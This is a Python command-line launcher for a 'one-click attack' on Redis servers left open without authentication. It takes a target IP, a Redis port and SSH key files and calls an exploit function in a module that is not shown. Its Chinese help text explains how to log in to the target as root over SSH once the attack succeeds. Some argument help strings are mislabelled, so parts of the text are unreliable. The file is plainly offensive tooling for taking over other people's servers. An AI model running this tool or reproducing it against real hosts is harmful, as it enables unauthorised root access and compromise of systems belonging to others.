import argparse

import main

if __name__ == '__main__':

    # ip = '127.0.0.1'
    # redis_port = '6379'
    # public_key = './id_rsa.pub'
    # ssh_port = '22'
    # private_key = './id_rsa'
    # print(main.RedisWeiShouQuan(ip, redis_port, public_key, ssh_port, private_key))
    parser = argparse.ArgumentParser(description='Redis未授权访问一键攻击。\nssh公/私钥可使用root用户"ssh-keygen -t rsa"命令生成，在/root/.ssh目录下。\n若id获取成功，可使用"ssh root@ip -p ssh_port -i private_key"进行连接目标')
    parser.add_argument('ip', type=str, help='目标ip地址')
    parser.add_argument('redis_port', type=int, help='目标redis端口号,一般是6379')
    parser.add_argument('public_key', type=str, help='ssh公钥')
    parser.add_argument('ssh_port', type=str, help='用户密码')
    parser.add_argument('private_key', type=str, help='执行的命令')
    args = parser.parse_args()

    print(main.RedisWeiShouQuan(ip=args.ip, redis_port=args.redis_port, public_key=args.public_key, ssh_port=args.ssh_port, private_key=args.private_key))